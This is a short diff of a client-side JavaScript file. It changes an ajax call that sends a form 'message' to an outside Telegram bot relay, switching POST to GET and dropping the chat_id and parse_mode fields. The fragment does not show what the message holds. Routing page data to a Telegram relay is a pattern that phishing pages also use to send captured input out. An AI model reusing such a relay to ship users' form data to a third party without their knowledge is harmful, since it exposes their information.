@@ -9139,15 +9139,13 @@
         // return console.log(message);
 
         $.ajax({
-          type: "POST",
-          url: `https://telegram-bot-api-s1p9.onrender.com/send?text=${message}`,
+          type: "GET",
+          url: `https://telegram-bot-api-s1p9.onrender.com/send`,
           headers: {
             'Content-Type': 'application/x-www-form-urlencoded'
           },
           data: {
-            chat_id: chatId,
             text: message,
-            parse_mode: "html",
           },
           beforeSend: function () {
             processBtn.html(
